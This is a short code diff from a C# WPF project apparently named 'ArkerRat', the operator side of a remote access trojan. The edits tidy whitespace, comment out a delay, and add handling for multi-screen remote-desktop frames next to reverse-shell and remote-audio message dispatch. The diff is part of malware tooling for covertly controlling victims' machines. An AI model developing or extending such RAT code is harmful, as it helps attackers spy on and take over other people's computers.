@@ -66,7 +66,7 @@ namespace ArkerRatWpfVersion
                 }
             catch(Exception ex) { }
         }
-        
+
 
         public string data = string.Empty;
         private async void ReadData()
@@ -81,7 +81,7 @@ namespace ArkerRatWpfVersion
                     {
                         byte[] buffer = new byte[GlobalVariables.byteSize];
                         int bytesRead = await clientStream.ReadAsync(buffer, 0, buffer.Length);
-                        
+
                         if (bytesRead > 0)
                         {
                             string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
@@ -104,7 +104,7 @@ namespace ArkerRatWpfVersion
                             stringBuilder.Clear();
                         }
 
-                        await Task.Delay(1);
+                        //await Task.Delay(1);
                     }
                 }
                 catch (Exception ex) { }
@@ -139,8 +139,15 @@ namespace ArkerRatWpfVersion
                             reverseShellWindow.ReversShellFunction(subString);
                         }
                         else if (startDelimiter == "§RemoteDesktopStart§" && remoteDesktopWindowIsAlreadyOpen == true)
-                        {                            
-                                remoteDesktopWindow.frameQue.Enqueue(subString);   
+                        {
+                            if (subString.Contains("§screen§"))
+                            {
+                                remoteDesktopWindow.AddScreens(subString);
+                            }
+                            else
+                            {
+                                remoteDesktopWindow.frameQue.Enqueue(subString);
+                            }
                         }
                         else if (startDelimiter=="§RemoteAudioStart§")
                         {
